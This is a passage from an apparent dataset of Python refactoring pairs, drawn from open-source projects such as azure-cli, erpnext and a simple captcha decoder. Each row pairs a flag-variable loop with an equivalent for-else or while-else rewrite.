			args.append(str(floatToFixed(loc[a.axisTag], 14)))
		asm.append(""NPUSHW[ ] "" + ' '.join(args))
		asm.append(""ENDF[ ]"")
		fpgm.program.fromAssembly(asm)

		# Change maxp attributes as IDEF is added
		if 'maxp' in varfont:
			maxp = varfont['maxp']
			setattr(maxp, ""maxInstructionDefs"", 1 + getattr(maxp, ""maxInstructionDefs"", 0))
			setattr(maxp, ""maxStackElements"", max(len(loc), getattr(maxp, ""maxStackElements"", 0)))

	if 'name' in varfont:
		log.info(""Pruning name table"")
		exclude = {a.axisNameID for a in fvar.axes}
		for i in fvar.instances:
			exclude.add(i.subfamilyNameID)
			exclude.add(i.postscriptNameID)
		if 'ltag' in varfont:
			# Drop the whole 'ltag' table if all its language tags are referenced by
			# name records to be pruned.
			# TODO: prune unused ltag tags and re-enumerate langIDs accordingly
			excludedUnicodeLangIDs = [
				n.langID for n in varfont['name'].names
				if n.nameID in exclude and n.platformID == 0 and n.langID != 0xFFFF
			]
			if set(excludedUnicodeLangIDs) == set(range(len((varfont['ltag'].tags)))):
				del varfont['ltag']
		varfont['name'].names[:] = [
			n for n in varfont['name'].names
			if n.nameID not in exclude
		]

	if ""wght"" in location and ""OS/2"" in varfont:
		varfont[""OS/2""].usWeightClass = otRound(
			max(1, min(location[""wght""], 1000))
		)
	if ""wdth"" in location:
		wdth = location[""wdth""]
		for percent, widthClass in sorted(OS2_WIDTH_CLASS_VALUES.items()):
			if wdth < percent:
				varfont[""OS/2""].usWidthClass = widthClass
				break
		else:
			varfont[""OS/2""].usWidthClass = 9
	if ""slnt"" in location and ""post"" in varfont:
		varfont[""post""].italicAngle = max(-90, min(location[""slnt""], 90))

	log.info(""Removing variable tables"")
	for tag in ('avar','cvar','fvar','gvar','HVAR','MVAR','VVAR','STAT'):
		if tag in varfont:
			del varfont[tag]

	return varfont","for condition in record.ConditionSet.ConditionTable:
    if condition.Format == 1:
        axisIdx = condition.AxisIndex
        axisTag = fvar.axes[axisIdx].axisTag
        Min = condition.FilterRangeMinValue
        Max = condition.FilterRangeMaxValue
        v = loc[axisTag]
        if not Min <= v <= Max:
            applies = False
    else:
        applies = False
    if not applies:
        break
if applies:
    assert record.FeatureTableSubstitution.Version == 65536
    for rec in record.FeatureTableSubstitution.SubstitutionRecord:
        table.FeatureList.FeatureRecord[rec.FeatureIndex].Feature = rec.Feature
    break","for condition in record.ConditionSet.ConditionTable:
    if condition.Format == 1:
        axisIdx = condition.AxisIndex
        axisTag = fvar.axes[axisIdx].axisTag
        Min = condition.FilterRangeMinValue
        Max = condition.FilterRangeMaxValue
        v = loc[axisTag]
        if not Min <= v <= Max:
            applies = False
    else:
        applies = False
    if not applies:
        break
else:
    assert record.FeatureTableSubstitution.Version == 65536
    for rec in record.FeatureTableSubstitution.SubstitutionRecord:
        table.FeatureList.FeatureRecord[rec.FeatureIndex].Feature = rec.Feature
    break",0
simple-captcha-solver,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/simple-captcha-solver/captcha_decoder.py,https://github.com/ptigas/simple-captcha-solver/tree/master//captcha_decoder.py,,decoder$5,"def decoder(
        im,
        threshold=200,
        mask=""letters.bmp"",
        alphabet=""0123456789abcdef""):

    img = Image.open(im)
    img = img.convert(""RGB"")
    box = (8, 8, 58, 18)
    img = img.crop(box)
    pixdata = img.load()

    # open the mask
    letters = Image.open(mask)
    ledata = letters.load()

    def test_letter(img, letter):
        A = img.load()
        B = letter.load()
        mx = 1000000
        max_x = 0
        x = 0
        for x in range(img.size[0] - letter.size[0]):
            _sum = 0
            for i in range(letter.size[0]):
                for j in range(letter.size[1]):
                    _sum = _sum + abs(A[x + i, j][0] - B[i, j][0])
            if _sum < mx:
                mx = _sum
                max_x = x
        return mx, max_x

    # Clean the background noise, if color != white, then set to black.
    for y in range(img.size[1]):
        for x in range(img.size[0]):
            if (pixdata[x, y][0] > threshold) \
                    and (pixdata[x, y][1] > threshold) \
                    and (pixdata[x, y][2] > threshold):

                pixdata[x, y] = (255, 255, 255, 255)
            else:
                pixdata[x, y] = (0, 0, 0, 255)

    counter = 0
    old_x = -1

    letterlist = []

    for x in range(letters.size[0]):
        black = True
        for y in range(letters.size[1]):
            if ledata[x, y][0] != 0:
                black = False
                break
        if black:
            box = (old_x + 1, 0, x, 10)
            letter = letters.crop(box)
            t = test_letter(img, letter)
            letterlist.append((t[0], alphabet[counter], t[1]))
            old_x = x
            counter += 1

    box = (old_x + 1, 0, 140, 10)
    letter = letters.crop(box)
    t = test_letter(img, letter)
    letterlist.append((t[0], alphabet[counter], t[1]))

    t = sorted(letterlist)
    t = t[0:5]  # 5-letter captcha

    final = sorted(t, key=lambda e: e[2])

    answer = ''.join(map(lambda l: l[1], final))
    return answer","for y in range(letters.size[1]):
    if ledata[x, y][0] != 0:
        black = False
        break
if black:
    box = (old_x + 1, 0, x, 10)
    letter = letters.crop(box)
    t = test_letter(img, letter)
    letterlist.append((t[0], alphabet[counter], t[1]))
    old_x = x
    counter += 1","for y in range(letters.size[1]):
    if ledata[x, y][0] != 0:
        break
else:
    box = (old_x + 1, 0, x, 10)
    letter = letters.crop(box)
    t = test_letter(img, letter)
    letterlist.append((t[0], alphabet[counter], t[1]))
    old_x = x
    counter += 1",0
coding-interview-gym,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/coding-interview-gym/leetcode.com/python/1007_Minimum_Domino_Rotations_For_Equal_Row.py,https://github.com/partho-maple/coding-interview-gym/tree/master/leetcode.com/python/1007_Minimum_Domino_Rotations_For_Equal_Row.py,Solution,minDominoRotations$4,"def minDominoRotations(self, A, B):
        """"""
        :type A: List[int]
        :type B: List[int]
        :rtype: int
        """"""
        result = float(""inf"")
        for domino in range(1, 7):  # Since each domino can have only 1 to 6 values. So check all values if we can make it
            isPossible = True
            topRorationCount, bottomRotationCount = 0, 0
            for a, b in zip(A, B):
                if domino != a and domino != b: #
                    isPossible = False
                    break
                if domino == a and domino != b:
                    bottomRotationCount += 1
                elif domino != a and domino == b:
                    topRorationCount += 1
            if isPossible:
                result = min(result, min(topRorationCount, bottomRotationCount))
        return -1 if result == float(""inf"") else result","for (a, b) in zip(A, B):
    if domino != a and domino != b:
        isPossible = False
        break
    if domino == a and domino != b:
        bottomRotationCount += 1
    elif domino != a and domino == b:
        topRorationCount += 1
if isPossible:
    result = min(result, min(topRorationCount, bottomRotationCount))","for (a, b) in zip(A, B):
    if domino != a and domino != b:
        break
    if domino == a and domino != b:
        bottomRotationCount += 1
    elif domino != a and domino == b:
        topRorationCount += 1
else:
    result = min(result, min(topRorationCount, bottomRotationCount))",0
hearthbreaker,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/hearthbreaker/hearthbreaker/replay.py,https://github.com/danielyule/hearthbreaker/tree/master/hearthbreaker/replay.py,Replay,__shorten_deck$143,"def __shorten_deck(self, cards):
        """"""
        Mostly for testing, this function will check if the deck is made up of a repeating pattern  and if so, shorten
        the output, since the parser will generate the pattern from a shorter sample
        :param cards: The deck of cards to replace
        :return: an array of cards that represents the deck if repeated until 30 cards are found
        """"""
        for pattern_length in range(1, 15):
            matched = True
            for index in range(pattern_length, 30):
                if not isinstance(cards[index % pattern_length], type(cards[index])):
                    matched = False
                    break
            if matched:
                return cards[0:pattern_length]
        return cards","for index in range(pattern_length, 30):
    if not isinstance(cards[index % pattern_length], type(cards[index])):
        matched = False
        break
if matched:
    return cards[0:pattern_length]","for index in range(pattern_length, 30):
    if not isinstance(cards[index % pattern_length], type(cards[index])):
        break
else:
    return cards[0:pattern_length]",0
erpnext,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/erpnext/erpnext/accounts/report/tax_detail/tax_detail.py,https://github.com/frappe/erpnext/tree/master/erpnext/accounts/report/tax_detail/tax_detail.py,,run_report$71,"def run_report(report_name, data):
	""Applies the sections and filters saved in the custom report""
	report_config = json.loads(frappe.get_doc(""Report"", report_name).json)
	# Columns indexed from 1 wrt colno
	columns = report_config.get(""columns"")
	sections = report_config.get(""sections"", {})
	show_detail = report_config.get(""show_detail"", 1)
	report = {}
	new_data = []
	summary = []
	for section_name, section in sections.items():
		report[section_name] = {""rows"": [], ""subtotal"": 0.0}
		for component_name, component in section.items():
			if component[""type""] == ""filter"":
				for row in data:
					matched = True
					for colno, filter_string in component[""filters""].items():
						filter_field = columns[int(colno) - 1][""fieldname""]
						if not filter_match(row[filter_field], filter_string):
							matched = False
							break
					if matched:
						report[section_name][""rows""] += [row]
						report[section_name][""subtotal""] += row[""amount""]
			if component[""type""] == ""section"":
				if component_name == section_name:
					frappe.throw(_(""A report component cannot refer to its parent section"") + "": "" + section_name)
				try:
					report[section_name][""rows""] += report[component_name][""rows""]
					report[section_name][""subtotal""] += report[component_name][""subtotal""]
				except KeyError:
					frappe.throw(
						_(""A report component can only refer to an earlier section"") + "": "" + section_name
					)

		if show_detail:
			new_data += report[section_name][""rows""]
		new_data += [{""voucher_no"": section_name, ""amount"": report[section_name][""subtotal""]}]
		summary += [
			{""label"": section_name, ""datatype"": ""Currency"", ""value"": report[section_name][""subtotal""]}
		]
		if show_detail:
			new_data += [{}]
	return new_data or data, summary or None","for (colno, filter_string) in component['filters'].items():
    filter_field = columns[int(colno) - 1]['fieldname']
    if not filter_match(row[filter_field], filter_string):
        matched = False
        break
if matched:
    report[section_name]['rows'] += [row]
    report[section_name]['subtotal'] += row['amount']","for (colno, filter_string) in component['filters'].items():
    filter_field = columns[int(colno) - 1]['fieldname']
    if not filter_match(row[filter_field], filter_string):
        break
else:
    report[section_name]['rows'] += [row]
    report[section_name]['subtotal'] += row['amount']",0
scikit-mobility,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/scikit-mobility/skmob/measures/individual.py,https://github.com/scikit-mobility/scikit-mobility/tree/master/skmob/measures/individual.py,,in_seq$366,"def in_seq(a, b):
        for i in range(len(a) - len(b) + 1):
            valid = True
            for j, v in enumerate(b):
                if a[i + j] != v:
                    valid = False
                    break
            if valid: return True
        return False","for (j, v) in enumerate(b):
    if a[i + j] != v:
        valid = False
        break
if valid:
    return True","for (j, v) in enumerate(b):
    if a[i + j] != v:
        break
else:
    return True",0
JavaScriptEnhancements,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/JavaScriptEnhancements/src/listeners/completion.py,https://github.com/pichillilorenzo/JavaScriptEnhancements/tree/master/src/listeners/completion.py,,load_default_autocomplete$13,"def load_default_autocomplete(view, comps_to_campare, prefix, location, isHover = False):

  if not prefix :
    return []
  
  scope = view.scope_name(location-(len(prefix)+1)).strip()

  if scope.endswith("" punctuation.accessor.js"") or scope.endswith("" keyword.operator.accessor.js"") :
    return []

  prefix = prefix.lower()
  completions = default_completions
  completions_to_add = []
  for completion in completions: 
    c = completion[0].lower()
    if not isHover:
      if prefix in c:
        completions_to_add.append((completion[0], completion[1]))
    else :
      if len(completion) == 3 and c.startswith(prefix) :
        completions_to_add.append(completion[2])
  final_completions = []
  for completion in completions_to_add:
    flag = False
    for c_to_campare in comps_to_campare:
      if not isHover and completion[0].split(""\t"")[0] == c_to_campare[0].split(""\t"")[0] :
        flag = True
        break
      elif isHover and completion[""name""] == c_to_campare[""name""] :
        flag = True
        break
    if not flag :
      final_completions.append(completion)

  return final_completions","for c_to_campare in comps_to_campare:
    if not isHover and completion[0].split('\t')[0] == c_to_campare[0].split('\t')[0]:
        flag = True
        break
    elif isHover and completion['name'] == c_to_campare['name']:
        flag = True
        break
if not flag:
    final_completions.append(completion)","for c_to_campare in comps_to_campare:
    if not isHover and completion[0].split('\t')[0] == c_to_campare[0].split('\t')[0]:
        break
    elif isHover and completion['name'] == c_to_campare['name']:
        break
else:
    final_completions.append(completion)",0
nni,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nni/nni/compression/pytorch/utils/mask_conflict.py,https://github.com/microsoft/nni/tree/master/nni/compression/pytorch/utils/mask_conflict.py,,detect_channel_prune_type$324,"def detect_channel_prune_type(masks, model):
    """"""
    User can prune a channel through two ways: 1) prune
    the corresponding filter of the conv layer(all the
    filter related pruner), 2) prune the BN layers that
    followed after a conv(Slim pruner). This function find
    the pruning type of the masks.

    Parameters
    ----------
    masks: dict
        A dict object that stores the masks.
    model: nn.Module
        Model object which the mask can be applied on.

    Returns:
    -------
    prune_type: str
        Could be Filter or Batchnorm
    """"""
    prune_type = 'Filter'
    all_batch_norm = True
    for layer_name in masks:
        _, m = get_module_by_name(model, layer_name)
        if m is None or (not isinstance(m, torch.nn.BatchNorm2d)):
            all_batch_norm = False
            break
    if all_batch_norm:
        # if all masks are for batchnorm layers, then the prune_type is BatchNorm
        # Note, actually we currently do not support pruning both Conv and BatchNorm
        # at the same time.
        prune_type = 'Batchnorm'
    return prune_type","for layer_name in masks:
    (_, m) = get_module_by_name(model, layer_name)
    if m is None or not isinstance(m, torch.nn.BatchNorm2d):
        all_batch_norm = False
        break
if all_batch_norm:
    prune_type = 'Batchnorm'","for layer_name in masks:
    (_, m) = get_module_by_name(model, layer_name)
    if m is None or not isinstance(m, torch.nn.BatchNorm2d):
        break
else:
    prune_type = 'Batchnorm'",0
OpenWPM,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/OpenWPM/openwpm/browser_manager.py,https://github.com/openwpm/OpenWPM/tree/master/openwpm/browser_manager.py,BrowserManager,_start_extension$657,"def _start_extension(self, browser_profile_path: Path) -> ClientSocket:
        """"""Start up the extension
        Blocks until the extension has fully started up
        """"""
        assert self.browser_params.browser_id is not None
        self.logger.debug(
            ""BROWSER %i: Looking for extension port information ""
            ""in %s"" % (self.browser_params.browser_id, browser_profile_path)
        )
        elapsed = 0.0
        port = None
        ep_filename = browser_profile_path / ""extension_port.txt""
        while elapsed < 5:
            try:
                with open(ep_filename, ""rt"") as f:
                    port = int(f.read().strip())
                    break
            except IOError as e:
                if e.errno != errno.ENOENT:
                    raise
            time.sleep(0.1)
            elapsed += 0.1
        if port is None:
            # try one last time, allowing all exceptions to propagate
            with open(ep_filename, ""rt"") as f:
                port = int(f.read().strip())

        ep_filename.unlink()
        self.logger.debug(
            ""BROWSER %i: Connecting to extension on port %i""
            % (self.browser_params.browser_id, port)
        )
        extension_socket = ClientSocket(serialization=""json"")
        extension_socket.connect(""127.0.0.1"", int(port))

        success_filename = browser_profile_path / ""OPENWPM_STARTUP_SUCCESS.txt""
        startup_successful = False
        while elapsed < 10:
            if success_filename.exists():
                startup_successful = True
                break
            time.sleep(0.1)
            elapsed += 0.1

        if not startup_successful:
            self.logger.error(
                ""BROWSER %i: Failed to complete extension startup in time"",
                self.browser_params.browser_id,
            )
            raise BrowserConfigError(""The extension did not boot up in time"")
        success_filename.unlink()
        return extension_socket","while elapsed < 10:
    if success_filename.exists():
        startup_successful = True
        break
    time.sleep(0.1)
    elapsed += 0.1
if not startup_successful:
    self.logger.error('BROWSER %i: Failed to complete extension startup in time', self.browser_params.browser_id)
    raise BrowserConfigError('The extension did not boot up in time')","while elapsed < 10:
    if success_filename.exists():
        break
    time.sleep(0.1)
    elapsed += 0.1
else:
    self.logger.error('BROWSER %i: Failed to complete extension startup in time', self.browser_params.browser_id)
    raise BrowserConfigError('The extension did not boot up in time')",0
rotki,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/rotki/rotkehlchen/exchanges/bitstamp.py,https://github.com/rotki/rotki/tree/master/rotkehlchen/exchanges/bitstamp.py,Bitstamp,_deserialize_asset_movement$518,"def _deserialize_asset_movement(
            raw_movement: Dict[str, Any],
    ) -> AssetMovement:
        """"""Process a deposit/withdrawal user transaction from Bitstamp and
        deserialize it.

        Can raise DeserializationError.

        From Bitstamp documentation, deposits/withdrawals can have a fee
        (the amount is expected to be in the currency involved)
        https://www.bitstamp.net/fee-schedule/

        Endpoint docs:
        https://www.bitstamp.net/api/#user-transactions
        """"""
        type_ = deserialize_int_from_str(raw_movement['type'], 'bitstamp asset movement')
        category: AssetMovementCategory
        if type_ == 0:
            category = AssetMovementCategory.DEPOSIT
        elif type_ == 1:
            category = AssetMovementCategory.WITHDRAWAL
        else:
            raise AssertionError(f'Unexpected Bitstamp asset movement case: {type_}.')

        timestamp = deserialize_timestamp_from_bitstamp_date(raw_movement['datetime'])
        amount: FVal = ZERO
        fee_asset: AssetWithOracles
        for raw_movement_key, value in raw_movement.items():
            if raw_movement_key in KNOWN_NON_ASSET_KEYS_FOR_MOVEMENTS:
                continue
            try:
                candidate_fee_asset = asset_from_bitstamp(raw_movement_key)
            except (UnknownAsset, DeserializationError):
                continue
            try:
                amount = deserialize_asset_amount(value)
            except DeserializationError:
                continue
            if amount != ZERO:
                fee_asset = candidate_fee_asset
                break

        if amount == ZERO:
            raise DeserializationError(
                'Could not deserialize Bitstamp asset movement from user transaction. '
                f'Unexpected asset amount combination found in: {raw_movement}.',
            )

        asset_movement = AssetMovement(
            timestamp=timestamp,
            location=Location.BITSTAMP,
            category=category,
            address=None,  # requires query ""crypto_transactions"" endpoint
            transaction_id=None,  # requires query ""crypto_transactions"" endpoint
            asset=fee_asset,
            amount=abs(amount),
            fee_asset=fee_asset,
            fee=deserialize_fee(raw_movement['fee']),
            link=str(raw_movement['id']),
        )
        return asset_movement","for (raw_movement_key, value) in raw_movement.items():
    if raw_movement_key in KNOWN_NON_ASSET_KEYS_FOR_MOVEMENTS:
        continue
    try:
        candidate_fee_asset = asset_from_bitstamp(raw_movement_key)
    except (UnknownAsset, DeserializationError):
        continue
    try:
        amount = deserialize_asset_amount(value)
    except DeserializationError:
        continue
    if amount != ZERO:
        fee_asset = candidate_fee_asset
        break
if amount == ZERO:
    raise DeserializationError(f'Could not deserialize Bitstamp asset movement from user transaction. Unexpected asset amount combination found in: {raw_movement}.')","for (raw_movement_key, value) in raw_movement.items():
    if raw_movement_key in KNOWN_NON_ASSET_KEYS_FOR_MOVEMENTS:
        continue
    try:
        candidate_fee_asset = asset_from_bitstamp(raw_movement_key)
    except (UnknownAsset, DeserializationError):
        continue
    try:
        amount = deserialize_asset_amount(value)
    except DeserializationError:
        continue
    if amount != ZERO:
        fee_asset = candidate_fee_asset
        break
else:
    raise DeserializationError(f'Could not deserialize Bitstamp asset movement from user transaction. Unexpected asset amount combination found in: {raw_movement}.')",0
i3ipc-python,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/i3ipc-python/i3ipc/aio/connection.py,https://github.com/altdesktop/i3ipc-python/tree/master/i3ipc/aio/connection.py,Connection,_reconnect$412,"def _reconnect(self) -> Future:
        if self._reconnect_future is not None:
            return self._reconnect_future

        self._reconnect_future = self._loop.create_future()

        async def do_reconnect():
            error = None

            for tries in range(0, 1000):
                try:
                    await self.connect()
                    error = None
                    break
                except Exception as e:
                    error = e
                    await asyncio.sleep(0.001)

            if error:
                self._reconnect_future.set_exception(error)
            else:
                self._reconnect_future.set_result(None)

            self._reconnect_future = None

        ensure_future(do_reconnect())

        return self._reconnect_future","for tries in range(0, 1000):
    try:
        await self.connect()
        error = None
        break
    except Exception as e:
        error = e
        await asyncio.sleep(0.001)
if error:
    self._reconnect_future.set_exception(error)
else:
    self._reconnect_future.set_result(None)","for tries in range(0, 1000):
    try:
        await self.connect()
        error = None
        self._reconnect_future.set_result(None)
        break
    except Exception as e:
        error = e
        await asyncio.sleep(0.001)
else:
    self._reconnect_future.set_exception(error)",0
Mycodo,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Mycodo/mycodo/utils/lockfile.py,https://github.com/kizniche/Mycodo/tree/master/mycodo/utils/lockfile.py,LockFile,lock_acquire$19,"def lock_acquire(self, lockfile, timeout):
        """"""Non-blocking locking method.""""""
        self.lock[lockfile] = filelock.FileLock(lockfile, timeout=1)
        self.locked[lockfile] = False
        timer = time.time() + timeout
        logger.debug(""Acquiring lock for {} ({} sec timeout)"".format(lockfile, timeout))
        while time.time() < timer:
            try:
                self.lock[lockfile].acquire()
                seconds = time.time() - (timer - timeout)
                logger.debug(""Lock acquired for {} in {:.3f} seconds"".format(lockfile, seconds))
                self.locked[lockfile] = True
                break
            except:
                pass
            time.sleep(0.05)
        if not self.locked[lockfile]:
            logger.debug(""Lock unable to be acquired after {:.3f} seconds. Breaking lock."".format(timeout))
            self.lock_release(lockfile)
        else:
            return True","while time.time() < timer:
    try:
        self.lock[lockfile].acquire()
        seconds = time.time() - (timer - timeout)
        logger.debug('Lock acquired for {} in {:.3f} seconds'.format(lockfile, seconds))
        self.locked[lockfile] = True
        break
    except:
        pass
    time.sleep(0.05)
if not self.locked[lockfile]:
    logger.debug('Lock unable to be acquired after {:.3f} seconds. Breaking lock.'.format(timeout))
    self.lock_release(lockfile)
else:
    return True","while time.time() < timer:
    try:
        self.lock[lockfile].acquire()
        seconds = time.time() - (timer - timeout)
        logger.debug('Lock acquired for {} in {:.3f} seconds'.format(lockfile, seconds))
        return True
        break
    except:
        pass
    time.sleep(0.05)
else:
    logger.debug('Lock unable to be acquired after {:.3f} seconds. Breaking lock.'.format(timeout))
    self.lock_release(lockfile)",0
sdc,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/sdc/docs/source/buildscripts/sdc_object_utils.py,https://github.com/IntelPython/sdc/tree/master/docs/source/buildscripts/sdc_object_utils.py,,get_obj$149,"def get_obj(obj_name):
    """"""
    Retrieves object corresponding to fully qualified name obj_name.

    The fully qualified name starts with the imported module name visible by sys.modules followed by
    submodules and then classes and finally by class attributes
    :param obj_name: Fully qualified object name string
    :return: If found, returns the object corresponding to obj_name. Otherwise raises exception
    :raises AttributeError: If submodule or attribute does not exists
    """"""
    split_name = obj_name.split('.')
    split_obj = sys.modules[split_name[0]]

    # Iterate through submodules
    while ismodule(split_obj) and len(split_name) > 1:
        split_name.pop(0)
        not_found = True
        for (name, obj) in getmembers(split_obj):  # Go through members of split_obj
            if split_name[0] == name:
                not_found = False
                break

        if not_found:
            raise AttributeError('Member `' + split_name[0] + '` for `' + obj_name + '` does not exists')

        split_obj = obj

    split_name.pop(0)
    for name in split_name:
        split_obj = getattr(split_obj, name, 0)

    return split_obj","for (name, obj) in getmembers(split_obj):
    if split_name[0] == name:
        not_found = False
        break
if not_found:
    raise AttributeError('Member `' + split_name[0] + '` for `' + obj_name + '` does not exists')","for (name, obj) in getmembers(split_obj):
    if split_name[0] == name:
        break
else:
    raise AttributeError('Member `' + split_name[0] + '` for `' + obj_name + '` does not exists')",0
Axelrod,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Axelrod/axelrod/_strategy_utils.py,https://github.com/Axelrod-Python/Axelrod/tree/master/axelrod/_strategy_utils.py,,detect_cycle$13,"def detect_cycle(history, min_size=1, max_size=12, offset=0):
    """"""Detects cycles in the sequence history.

    Mainly used by hunter strategies.

    Parameters
    ----------
    history: sequence of C and D
        The sequence to look for cycles within
    min_size: int, 1
        The minimum length of the cycle
    max_size: int, 12
        The maximum length of the cycle
    offset: int, 0
        The amount of history to skip initially

    Returns
    -------
    Tuple of C and D
        The cycle detected in the input history
    """"""
    history_tail = history[offset:]
    new_max_size = min(len(history_tail) // 2, max_size)
    for i in range(min_size, new_max_size + 1):
        has_cycle = True
        cycle = tuple(history_tail[:i])
        for j, elem in enumerate(history_tail):
            if elem != cycle[j % len(cycle)]:
                has_cycle = False
                break
        if has_cycle:
            return cycle
    return None","for (j, elem) in enumerate(history_tail):
    if elem != cycle[j % len(cycle)]:
        has_cycle = False
        break
if has_cycle:
    return cycle","for (j, elem) in enumerate(history_tail):
    if elem != cycle[j % len(cycle)]:
        break
else:
    return cycle",0
Jarvis,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Jarvis/jarviscli/plugins/mips_conv.py,https://github.com/sukeesh/Jarvis/tree/master/jarviscli/plugins/mips_conv.py,MipsConverter,__getRegBin$234,"def __getRegBin(self, regR, regName, regCode, jarvis):
        regCntr = 0
        flag = False
        regBin = """"

        while (regCntr < len(regName)):
            if (regName[regCntr] == regR):
                flag = True
                break
            regCntr = regCntr + 1

        if (flag is False):
            jarvis.say(""Instruction is syntactically incorrect"")
        else:
            regBin = regCode[regCntr]

        return regBin","while regCntr < len(regName):
    if regName[regCntr] == regR:
        flag = True
        break
    regCntr = regCntr + 1
if flag is False:
    jarvis.say('Instruction is syntactically incorrect')
else:
    regBin = regCode[regCntr]","while regCntr < len(regName):
    if regName[regCntr] == regR:
        regBin = regCode[regCntr]
        break
    regCntr = regCntr + 1
else:
    jarvis.say('Instruction is syntactically incorrect')",0
PyRetri,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/PyRetri/search/utils/misc.py,https://github.com/PyRetri/PyRetri/tree/master/search/utils/misc.py,,check_result_exist$7,"def check_result_exist(now_res: Dict, exist_results: List) -> bool:
    """"""
    Check if the config exists.

    Args:
        now_res (Dict): configuration to be checked.
        exist_results (List): a list of existing configurations.

    Returns:
        bool: if the config exists.
    """"""
    for e_r in exist_results:
        totoal_equal = True
        for key in now_res:
            if now_res[key] != e_r[key]:
                totoal_equal = False
                break
        if totoal_equal:
            return True
    return False","for key in now_res:
    if now_res[key] != e_r[key]:
        totoal_equal = False
        break
if totoal_equal:
    return True","for key in now_res:
    if now_res[key] != e_r[key]:
        break
else:
    return True",0
azure-cli,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/azure-cli/src/azure-cli/azure/cli/command_modules/keyvault/custom.py,https://github.com/Azure/azure-cli/tree/master/src/azure-cli/azure/cli/command_modules/keyvault/custom.py,,add_network_rule$951,"def add_network_rule(cmd, client, resource_group_name, vault_name, ip_address=None, subnet=None,
                     vnet_name=None, no_wait=False):  # pylint: disable=unused-argument
    """""" Add a network rule to the network ACLs for a Key Vault. """"""

    VirtualNetworkRule = cmd.get_models('VirtualNetworkRule', resource_type=ResourceType.MGMT_KEYVAULT)
    IPRule = cmd.get_models('IPRule', resource_type=ResourceType.MGMT_KEYVAULT)
    VaultCreateOrUpdateParameters = cmd.get_models('VaultCreateOrUpdateParameters',
                                                   resource_type=ResourceType.MGMT_KEYVAULT)
    vault = client.get(resource_group_name=resource_group_name, vault_name=vault_name)
    vault.properties.network_acls = vault.properties.network_acls or _create_network_rule_set(cmd)
    rules = vault.properties.network_acls

    if not subnet and not ip_address:
        logger.warning('No subnet or ip address supplied.')

    to_update = False
    if subnet:
        rules.virtual_network_rules = rules.virtual_network_rules or []

        # if the rule already exists, don't add again
        to_modify = True
        for x in rules.virtual_network_rules:
            if x.id.lower() == subnet.lower():
                to_modify = False
                break
        if to_modify:
            rules.virtual_network_rules.append(VirtualNetworkRule(id=subnet))
            to_update = True

    if ip_address:
        rules.ip_rules = rules.ip_rules or []
        # if the rule already exists, don't add again
        for ip in ip_address:
            to_modify = True
            for x in rules.ip_rules:
                existing_ip_network = ip_network(x.value)
                new_ip_network = ip_network(ip)
                if new_ip_network.overlaps(existing_ip_network):
                    logger.warning(""IP/CIDR %s overlaps with %s, which exists already. Not adding duplicates."",
                                   ip, x.value)
                    to_modify = False
                    break
            if to_modify:
                rules.ip_rules.append(IPRule(value=ip))
                to_update = True

    # if we didn't modify the network rules just return the vault as is
    if not to_update:
        return vault

    return _azure_stack_wrapper(cmd, client, 'create_or_update',
                                resource_type=ResourceType.MGMT_KEYVAULT,
                                min_api_version='2018-02-14',
                                resource_group_name=resource_group_name,
                                vault_name=vault_name,
                                parameters=VaultCreateOrUpdateParameters(
                                    location=vault.location,
                                    tags=vault.tags,
                                    properties=vault.properties),
                                no_wait=no_wait)","for x in rules.virtual_network_rules:
    if x.id.lower() == subnet.lower():
        to_modify = False
        break
if to_modify:
    rules.virtual_network_rules.append(VirtualNetworkRule(id=subnet))
    to_update = True","for x in rules.virtual_network_rules:
    if x.id.lower() == subnet.lower():
        break
else:
    rules.virtual_network_rules.append(VirtualNetworkRule(id=subnet))
    to_update = True",0
azure-cli,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/azure-cli/src/azure-cli/azure/cli/command_modules/keyvault/custom.py,https://github.com/Azure/azure-cli/tree/master/src/azure-cli/azure/cli/command_modules/keyvault/custom.py,,add_network_rule$951,"def add_network_rule(cmd, client, resource_group_name, vault_name, ip_address=None, subnet=None,
                     vnet_name=None, no_wait=False):  # pylint: disable=unused-argument
    """""" Add a network rule to the network ACLs for a Key Vault. """"""

    VirtualNetworkRule = cmd.get_models('VirtualNetworkRule', resource_type=ResourceType.MGMT_KEYVAULT)
    IPRule = cmd.get_models('IPRule', resource_type=ResourceType.MGMT_KEYVAULT)
    VaultCreateOrUpdateParameters = cmd.get_models('VaultCreateOrUpdateParameters',
                                                   resource_type=ResourceType.MGMT_KEYVAULT)
    vault = client.get(resource_group_name=resource_group_name, vault_name=vault_name)
    vault.properties.network_acls = vault.properties.network_acls or _create_network_rule_set(cmd)
    rules = vault.properties.network_acls

    if not subnet and not ip_address:
        logger.warning('No subnet or ip address supplied.')

    to_update = False
    if subnet:
        rules.virtual_network_rules = rules.virtual_network_rules or []

        # if the rule already exists, don't add again
        to_modify = True
        for x in rules.virtual_network_rules:
            if x.id.lower() == subnet.lower():
                to_modify = False
                break
        if to_modify:
            rules.virtual_network_rules.append(VirtualNetworkRule(id=subnet))
            to_update = True

    if ip_address:
        rules.ip_rules = rules.ip_rules or []
        # if the rule already exists, don't add again
        for ip in ip_address:
            to_modify = True
            for x in rules.ip_rules:
                existing_ip_network = ip_network(x.value)
                new_ip_network = ip_network(ip)
                if new_ip_network.overlaps(existing_ip_network):
                    logger.warning(""IP/CIDR %s overlaps with %s, which exists already. Not adding duplicates."",
                                   ip, x.value)
                    to_modify = False
                    break
            if to_modify:
                rules.ip_rules.append(IPRule(value=ip))
                to_update = True

    # if we didn't modify the network rules just return the vault as is
    if not to_update:
        return vault

    return _azure_stack_wrapper(cmd, client, 'create_or_update',
